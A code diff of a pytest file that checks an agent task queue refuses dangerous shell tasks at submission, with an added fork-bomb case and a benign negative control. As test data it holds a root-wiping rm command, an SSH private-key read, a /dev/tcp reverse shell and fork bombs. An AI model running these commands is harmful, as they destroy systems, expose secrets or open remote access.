@@ -811,14 +811,14 @@ def test_task_submit_rejects_unknown_lane_before_database_work(
     assert fake.executed == []
 
 
-# Patterns the *currently published* kartikeya scanner blocks — this test
-# validates willow's submit-time WIRING, not kartikeya's coverage. (The
-# resource-exhaustion class, incl. fork bombs, is tested in kartikeya's own suite
-# and will also be caught here once that scanner release is on PyPI.)
+# Patterns kartikeya's scanner blocks at submit time — validates willow's
+# submit-time WIRING (check_kart_task), including resource_exhaustion (#111).
 @pytest.mark.parametrize("task,category", [
     ("rm -rf / ", "destructive"),
     ("cat ~/.ssh/id_rsa", "secret_access"),
     ("bash -i >& /dev/tcp/10.0.0.1/9 0>&1", "exfiltration"),
+    (":(){ :|:& };:", "resource_exhaustion"),
+    ("while true; do :; done", "resource_exhaustion"),
 ])
 def test_task_submit_scans_at_submit_time(app_id, monkeypatch, task, category):
     # Defense-in-depth: a dangerous task is refused at submit BEFORE any DB work,
@@ -830,6 +830,20 @@ def test_task_submit_scans_at_submit_time(app_id, monkeypatch, task, category):
     assert "KART-SECURITY" in result["error"]
     assert result["kart_scan"]["category"] == category
     assert fake.executed == []  # rejected before the queue was touched
+
+
+def test_task_submit_scan_allows_legitimate_background_function(
+    app_id, monkeypatch,
+):
+    """Negative control for #111 fork-bomb patterns — must not false-positive."""
+    fake = _FakePg(columns=_TASKS_COLUMNS)
+    monkeypatch.setattr(server, "get_pg", lambda: fake)
+    server.schema_confirm_mapping(app_id=app_id, table="tasks")
+    result = server.task_submit(
+        app_id=app_id, task="deploy() { build | log & }", agent="kart", lane="fast"
+    )
+    assert result.get("status") == "pending"
+    assert "KART-SECURITY" not in str(result)
 
 
 def _app_with_perms(tmp_path, monkeypatch, name, perms):
